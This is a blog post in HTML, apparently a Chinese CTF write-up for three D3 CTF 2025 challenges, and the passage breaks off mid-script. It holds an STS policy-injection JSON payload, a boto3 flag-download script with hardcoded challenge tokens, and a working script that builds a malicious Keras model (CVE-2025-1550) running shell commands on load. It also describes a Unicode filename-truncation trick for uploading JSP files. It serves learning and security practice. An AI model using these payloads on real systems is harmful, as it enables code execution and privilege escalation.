@@ -1,0 +1,734 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="fearless123">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="D3 CTF1.D3 invitation先伪造拿到jwt payload*:{“object_name”:”#&quot;]},{&quot;Effect&quot;:&quot;Allow&quot;,&quot;Action&quot;:[&quot;s3:&quot;],&quot;Resource&quot;:[&quot;arn:aws:s3:::&#x2F;*”}   2. STS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fearless123">
+<meta property="og:url" content="http://fearless-123.github.io/2025/06/11/D3%20CTF/index.html">
+<meta property="og:site_name" content="fearless123">
+<meta property="og:description" content="D3 CTF1.D3 invitation先伪造拿到jwt payload*:{“object_name”:”#&quot;]},{&quot;Effect&quot;:&quot;Allow&quot;,&quot;Action&quot;:[&quot;s3:&quot;],&quot;Resource&quot;:[&quot;arn:aws:s3:::&#x2F;*”}   2. STS">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="d:\ctf\%E7%AC%94%E8%AE%B0\%E5%9B%BE%E7%89%87\image-20250604171659123.png">
+<meta property="og:image" content="http://fearless-123.github.io/%E5%9B%BE%E7%89%87/image-20250605172402599.png">
+<meta property="og:image" content="http://fearless-123.github.io/%E5%9B%BE%E7%89%87/image-20250605173030056.png">
+<meta property="og:image" content="http://fearless-123.github.io/%E5%9B%BE%E7%89%87/9d51446618ba51c76ec67d8d48022af.png">
+<meta property="og:image" content="http://fearless-123.github.io/%E5%9B%BE%E7%89%87/image-20250608151105334.png">
+<meta property="og:image" content="http://fearless-123.github.io/%E5%9B%BE%E7%89%87/image-20250608151144852.png">
+<meta property="article:published_time" content="2025-06-11T13:22:12.948Z">
+<meta property="article:modified_time" content="2025-06-08T07:49:33.378Z">
+<meta property="article:author" content="fearless123">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="d:\ctf\%E7%AC%94%E8%AE%B0\%E5%9B%BE%E7%89%87\image-20250604171659123.png">
+  
+  
+  
+  <title>fearless123</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"fearless-123.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"OfnFQ9kB1ajL2mPoqcvGYy11-gzGzoHsz","app_key":"FxzCBhWmJYqZ3yxZGPqDOHe3","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>fearless123</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-06-11 21:22" pubdate>
+          June 11, 2025 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> views
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header"></h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="D3-CTF"><a href="#D3-CTF" class="headerlink" title="D3 CTF"></a>D3 CTF</h1><h2 id="1-D3-invitation"><a href="#1-D3-invitation" class="headerlink" title="1.D3 invitation"></a>1.D3 invitation</h2><p>先伪造拿到jwt</p>
+<p>payload*:{“object_name”:”#&quot;]},{&quot;Effect&quot;:&quot;Allow&quot;,&quot;Action&quot;:[&quot;s3:<em>&quot;],&quot;Resource&quot;:[&quot;arn:aws:s3:::</em>&#x2F;*”}</p>
+<p><img src="D:\ctf\笔记\图片\image-20250604171659123.png" srcset="/img/loading.gif" lazyload alt="image-20250604171659123"></p>
+<p><img src="/%E5%9B%BE%E7%89%87/image-20250605172402599.png" srcset="/img/loading.gif" lazyload alt="image-20250605172402599"></p>
+<p><strong>2. STS 令牌策略注入</strong></p>
+<ul>
+<li><p><strong>场景</strong>：后端生成 STS 策略时，未过滤用户输入，导致 RAM 策略被篡改。</p>
+</li>
+<li><p><strong>原理</strong>：用户输入恶意字符，嵌入 RAM 策略，扩大权限范围。</p>
+</li>
+<li><p><strong>payload</strong>:{“object_name”:”#&quot;]},{&quot;Effect&quot;:&quot;Allow&quot;,&quot;Action&quot;:[&quot;s3:<em>&quot;],&quot;Resource&quot;:[&quot;arn:aws:s3:::</em>&#x2F;*”}</p>
+<p>  <img src="/%E5%9B%BE%E7%89%87/image-20250605173030056.png" srcset="/img/loading.gif" lazyload alt="image-20250605173030056"></p>
+</li>
+</ul>
+<p>再拿着令牌去访问下载flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> boto3<br><span class="hljs-keyword">from</span> botocore.client <span class="hljs-keyword">import</span> Config<br><span class="hljs-keyword">from</span> botocore.exceptions <span class="hljs-keyword">import</span> ClientError<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">list_objects_in_bucket</span>(<span class="hljs-params">access_key, secret_key, session_token, endpoint, bucket</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;列出存储桶中的所有对象&quot;&quot;&quot;</span><br>    session = boto3.session.Session()<br>    s3 = session.client(<br>        service_name=<span class="hljs-string">&#x27;s3&#x27;</span>,<br>        endpoint_url=endpoint,<br>        aws_access_key_id=access_key,<br>        aws_secret_access_key=secret_key,<br>        aws_session_token=session_token,<br>        config=Config(signature_version=<span class="hljs-string">&#x27;s3v4&#x27;</span>),<br>        region_name=<span class="hljs-string">&#x27;us-east-1&#x27;</span><br>    )<br><br>    <span class="hljs-keyword">try</span>:<br>        response = s3.list_objects_v2(Bucket=bucket)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Contents&#x27;</span> <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;桶 &#x27;<span class="hljs-subst">&#123;bucket&#125;</span>&#x27; 中的对象列表:&quot;</span>)<br>            <span class="hljs-keyword">return</span> [obj[<span class="hljs-string">&#x27;Key&#x27;</span>] <span class="hljs-keyword">for</span> obj <span class="hljs-keyword">in</span> response[<span class="hljs-string">&#x27;Contents&#x27;</span>]]<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;桶 &#x27;<span class="hljs-subst">&#123;bucket&#125;</span>&#x27; 为空。&quot;</span>)<br>            <span class="hljs-keyword">return</span> []<br><br>    <span class="hljs-keyword">except</span> ClientError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;列出对象时出错: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> []<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_flag_file</span>(<span class="hljs-params">access_key, secret_key, session_token, endpoint, bucket, object_name, download_path</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;下载指定对象到本地文件&quot;&quot;&quot;</span><br>    session = boto3.session.Session()<br>    s3 = session.client(<br>        service_name=<span class="hljs-string">&#x27;s3&#x27;</span>,<br>        endpoint_url=endpoint,<br>        aws_access_key_id=access_key,<br>        aws_secret_access_key=secret_key,<br>        aws_session_token=session_token,<br>        config=Config(signature_version=<span class="hljs-string">&#x27;s3v4&#x27;</span>),<br>        region_name=<span class="hljs-string">&#x27;us-east-1&#x27;</span><br>    )<br><br>    <span class="hljs-keyword">try</span>:<br>        s3.download_file(bucket, object_name, download_path)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;成功下载 <span class="hljs-subst">&#123;object_name&#125;</span> 到 <span class="hljs-subst">&#123;download_path&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> ClientError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;下载失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    access_key = <span class="hljs-string">&quot;LG3NMF8KJW6PG6SCBDKJ&quot;</span><br>    secret_key = <span class="hljs-string">&quot;E6zlKw41LzXyCZ77RD1rkDm0ZYYY+eu1ZOjWt2OG&quot;</span><br>    session_token = <span class="hljs-string">&quot;eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiJMRzNOTUY4S0pXNlBHNlNDQkRLSiIsImV4cCI6MTc0OTAyOTg5OSwicGFyZW50IjoiQjlNMzIwUVhIRDM4V1VSMk1JWTMiLCJzZXNzaW9uUG9saWN5IjoiZXlKV1pYSnphVzl1SWpvaU1qQXhNaTB4TUMweE55SXNJbE4wWVhSbGJXVnVkQ0k2VzNzaVJXWm1aV04wSWpvaVFXeHNiM2NpTENKQlkzUnBiMjRpT2xzaWN6TTZSMlYwVDJKcVpXTjBJaXdpY3pNNlVIVjBUMkpxWldOMElsMHNJbEpsYzI5MWNtTmxJanBiSW1GeWJqcGhkM002Y3pNNk9qcGtNMmx1ZG1sMFlYUnBiMjR2S2lKZGZTeDdJa1ZtWm1WamRDSTZJa0ZzYkc5M0lpd2lRV04wYVc5dUlqcGJJbk16T2t4cGMzUkJiR3hOZVVKMVkydGxkSE1pWFN3aVVtVnpiM1Z5WTJVaU9sc2lLaW9pWFgwc2V5SkZabVpsWTNRaU9pSkJiR3h2ZHlJc0lrRmpkR2x2YmlJNld5SnpNenBIWlhSUFltcGxZM1FpTENKek16cFFkWFJQWW1wbFkzUWlYU3dpVW1WemIzVnlZMlVpT2xzaVlYSnVPbUYzY3pwek16bzZPbVpzWVdjdktpSmRmU3g3SWtWbVptVmpkQ0k2SWtGc2JHOTNJaXdpUVdOMGFXOXVJanBiSW5Nek9reHBjM1JDZFdOclpYUWlYU3dpVW1WemIzVnlZMlVpT2xzaVlYSnVPbUYzY3pwek16bzZPbVpzWVdjaVhYMWRmUT09In0.cJrQc8vU2lOW8RhX6Is1EqTMu0gXWl51aQ52URU4R19gfxh5Or1oOBrg7h9Wfj19MjJlgpXvJwOJXedW5m7zGQ&quot;</span><br>    endpoint = <span class="hljs-string">&quot;http://35.241.98.126:30093&quot;</span><br>    bucket = <span class="hljs-string">&quot;flag&quot;</span><br><br>    <span class="hljs-comment"># 列出桶中的对象</span><br>    objects = list_objects_in_bucket(access_key, secret_key, session_token, endpoint, bucket)<br><br>    <span class="hljs-comment"># 如果有对象，下载第一个对象</span><br>    <span class="hljs-keyword">if</span> objects:<br>        first_object = objects[<span class="hljs-number">0</span>]<br>        download_path = <span class="hljs-string">f&quot;downloaded_<span class="hljs-subst">&#123;first_object&#125;</span>&quot;</span><br>        download_flag_file(access_key, secret_key, session_token, endpoint, bucket, first_object, download_path)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;没有可下载的对象。&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-D3-model"><a href="#2-D3-model" class="headerlink" title="2.D3 model"></a>2.D3 model</h2><h3 id="通俗易懂解释-CVE-2025-1550：Keras-模型暗藏的-“黑客后门”"><a href="#通俗易懂解释-CVE-2025-1550：Keras-模型暗藏的-“黑客后门”" class="headerlink" title="通俗易懂解释 CVE-2025-1550：Keras 模型暗藏的 “黑客后门”"></a>通俗易懂解释 CVE-2025-1550：Keras 模型暗藏的 “黑客后门”</h3><h3 id="一、什么是-Keras-和漏洞？"><a href="#一、什么是-Keras-和漏洞？" class="headerlink" title="一、什么是 Keras 和漏洞？"></a>一、什么是 Keras 和漏洞？</h3><p>Keras 是一个常用的机器学习工具，用来创建和训练 AI 模型。就像我们用 Word 保存文档一样，Keras 会把模型保存成一个包含多个文件的 “包裹”（.keras 格式），里面有模型的 “蓝图”（config.json）、“元数据”（metadata.json）和 “训练数据”（weights.h5）。</p>
+<p><strong>漏洞的核心问题</strong>：当 Keras 加载一个恶意构造的模型文件（甚至只是一个恶意的 JSON 文件）时，黑客可以让你的电脑执行任意恶意代码（比如删除文件、下载病毒、远程控制电脑等）。这就像你打开一个看似正常的 Word 文档，结果里面藏着一个病毒程序，一打开就自动运行了。</p>
+<p><strong>关键点</strong>：漏洞的核心是 Keras 在反序列化模型配置时，允许动态加载任意 Python 模块并执行函数，且未对输入做安全过滤。这相当于给模型加载过程开了一个 “后门”，让恶意代码能伪装成模型配置被执行。</p>
+<p>payload:</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs lua">import zipfile<br>import json<br>from keras.models import Sequential<br>from keras.layers import Dense<br>import numpy as np<br>import <span class="hljs-built_in">os</span><br><br>model_name = <span class="hljs-string">&quot;test.keras&quot;</span><br><br>x_train = np.<span class="hljs-built_in">random</span>.rand(<span class="hljs-number">100</span>, <span class="hljs-number">28</span> * <span class="hljs-number">28</span>)<br>y_train = np.<span class="hljs-built_in">random</span>.rand(<span class="hljs-number">100</span>)<br><br>model = Sequential([Dense(<span class="hljs-number">1</span>, activation=<span class="hljs-string">&#x27;linear&#x27;</span>, input_dim=<span class="hljs-number">28</span> * <span class="hljs-number">28</span>)])<br><br>model.compile(optimizer=<span class="hljs-string">&#x27;adam&#x27;</span>, loss=<span class="hljs-string">&#x27;mse&#x27;</span>)<br>model.fit(x_train, y_train, epochs=<span class="hljs-number">5</span>)<br>model.save(model_name)<br><br>with zipfile.ZipFile(model_name, <span class="hljs-string">&quot;r&quot;</span>) as f:<br>    <span class="hljs-built_in">config</span> = json.loads(f.<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;config.json&quot;</span>).decode())<br><br><span class="hljs-built_in">config</span>[<span class="hljs-string">&quot;config&quot;</span>][<span class="hljs-string">&quot;layers&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;module&quot;</span>] = <span class="hljs-string">&quot;keras.models&quot;</span><br><span class="hljs-built_in">config</span>[<span class="hljs-string">&quot;config&quot;</span>][<span class="hljs-string">&quot;layers&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;class_name&quot;</span>] = <span class="hljs-string">&quot;Model&quot;</span><br><span class="hljs-built_in">config</span>[<span class="hljs-string">&quot;config&quot;</span>][<span class="hljs-string">&quot;layers&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;config&quot;</span>] = &#123;<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;mvlttt&quot;</span>,<br>    <span class="hljs-string">&quot;layers&quot;</span>: [<br>        &#123;<br>            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;mvlttt&quot;</span>,<br>            <span class="hljs-string">&quot;class_name&quot;</span>: <span class="hljs-string">&quot;function&quot;</span>,<br>            <span class="hljs-string">&quot;config&quot;</span>: <span class="hljs-string">&quot;Popen&quot;</span>,<br>            <span class="hljs-string">&quot;module&quot;</span>: <span class="hljs-string">&quot;subprocess&quot;</span>,<br>            <span class="hljs-string">&quot;inbound_nodes&quot;</span>: [&#123;<span class="hljs-string">&quot;args&quot;</span>: <span class="hljs-string">[[&quot;sh&quot;, &quot;-c&quot;,&quot;env&gt;/app/index.html&quot;]]</span>, <span class="hljs-string">&quot;kwargs&quot;</span>: &#123;<span class="hljs-string">&quot;bufsize&quot;</span>: <span class="hljs-number">-1</span>&#125;&#125;]<br>        &#125;],<br>    <span class="hljs-string">&quot;input_layers&quot;</span>: <span class="hljs-string">[[&quot;mvlttt&quot;, 0, 0]]</span>,<br>    <span class="hljs-string">&quot;output_layers&quot;</span>: <span class="hljs-string">[[&quot;mvlttt&quot;, 0, 0]]</span><br>&#125;<br><br>with zipfile.ZipFile(model_name, <span class="hljs-string">&#x27;r&#x27;</span>) as zip_read:<br>    with zipfile.ZipFile(f<span class="hljs-string">&quot;tmp.&#123;model_name&#125;&quot;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) as zip_write:<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> zip_read.infolist():<br>            <span class="hljs-keyword">if</span> item.filename != <span class="hljs-string">&quot;config.json&quot;</span>:<br>                zip_write.writestr(item, zip_read.<span class="hljs-built_in">read</span>(item.filename))<br><br><span class="hljs-built_in">os</span>.<span class="hljs-built_in">remove</span>(model_name)<br><span class="hljs-built_in">os</span>.<span class="hljs-built_in">rename</span>(f<span class="hljs-string">&quot;tmp.&#123;model_name&#125;&quot;</span>, model_name)<br><br>with zipfile.ZipFile(model_name, <span class="hljs-string">&quot;a&quot;</span>) as zf:<br>    zf.writestr(<span class="hljs-string">&quot;config.json&quot;</span>, json.dumps(<span class="hljs-built_in">config</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Malicious model ready&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>生成模型后上传，再刷新页面即可（将环境变量输出到主页）</p>
+<h2 id="3-D3-jtr"><a href="#3-D3-jtr" class="headerlink" title="3.D3 jtr"></a>3.D3 jtr</h2><h4 id="一、题目背景与核心问题"><a href="#一、题目背景与核心问题" class="headerlink" title="一、题目背景与核心问题"></a>一、题目背景与核心问题</h4><p>本题围绕网站备份系统的安全漏洞展开，核心难点在于：</p>
+<ul>
+<li>目标：上传 JSP 文件实现远程代码执行（RCE）</li>
+<li>限制：后端对文件名有严格校验，直接上传<code>.jsp</code>后缀会被拦截</li>
+<li>突破口：备份系统使用的<code>jtar</code>库存在文件名处理漏洞，可利用 Unicode 字符截断绕过校验</li>
+</ul>
+<h4 id="二、jtar-库的-Unicode-字符处理漏洞原理"><a href="#二、jtar-库的-Unicode-字符处理漏洞原理" class="headerlink" title="二、jtar 库的 Unicode 字符处理漏洞原理"></a>二、jtar 库的 Unicode 字符处理漏洞原理</h4><p><code>jtar</code>是一个 Java 实现的 tar 打包库，其核心问题出在<code>TarHeader</code>类的<code>getNameBytes</code>方法中。当处理包含 Unicode 字符的文件名时，库会将字符强制转换为字节（使用<code>(byte)</code>转换），这会导致<strong>高位字节被截断</strong>，仅保留低 8 位字节。</p>
+<h4 id="三、Unicode-字符截断攻击的具体实现"><a href="#三、Unicode-字符截断攻击的具体实现" class="headerlink" title="三、Unicode 字符截断攻击的具体实现"></a>三、Unicode 字符截断攻击的具体实现</h4><ol>
+<li><p><strong>字符截断原理</strong>：</p>
+<ul>
+<li>每个 Unicode 字符由 2 字节（或更多）表示，例如字符<code>陪</code>的 Unicode 编码为<code>U+966A</code>（十六进制）</li>
+<li>当执行<code>(byte)&#39;陪&#39;</code>时，实际计算为<code>(byte)0x966A</code>，由于强制转换为 byte 类型，仅保留低 8 位<code>0x6A</code></li>
+<li><code>0x6A</code>对应的 ASCII 字符正是<code>&#39;j&#39;</code>，因此<code>陪</code>在截断后变为<code>&#39;j&#39;</code></li>
+</ul>
+</li>
+<li><p><strong>构造攻击文件名</strong>：</p>
+<ul>
+<li>示例文件名：<code>payload.陪sp</code></li>
+<li>解析过程：<ul>
+<li>上传时，文件名包含<code>陪</code>（<code>U+966A</code>），系统校验可能只检查可见字符或简单规则，允许上传</li>
+<li>当使用 jtar 打包时，<code>陪</code>被截断为<code>&#39;j&#39;</code>，文件名变为<code>payload.jsp</code></li>
+<li>恢复备份时，文件被写入 JSP 解析目录，最终以<code>.jsp</code>后缀存在，实现解析执行</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>Unicode 字符搜索方法</strong>：</p>
+<ul>
+<li><p>使用用户提供的 Python 脚本可反向查找对应 ASCII 字符的 Unicode 字符</p>
+</li>
+<li><p>例如，查找对应<code>&#39;j&#39;</code>（ASCII 码 106，0x6A）的 Unicode 字符</p>
+</li>
+<li><p>查找脚本</p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> unicodedata<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_search</span>(<span class="hljs-params">byte_value</span>):<br>    low_byte = byte_value &amp; <span class="hljs-number">0xFF</span><br>    candidates = []<br>    <span class="hljs-keyword">for</span> high <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span> + <span class="hljs-number">1</span>):<br>        code_point = (high &lt;&lt; <span class="hljs-number">8</span>) | low_byte<br>        <span class="hljs-keyword">try</span>:<br>            char = <span class="hljs-built_in">chr</span>(code_point)<br>            name = unicodedata.name(char)<br>            candidates.append((<span 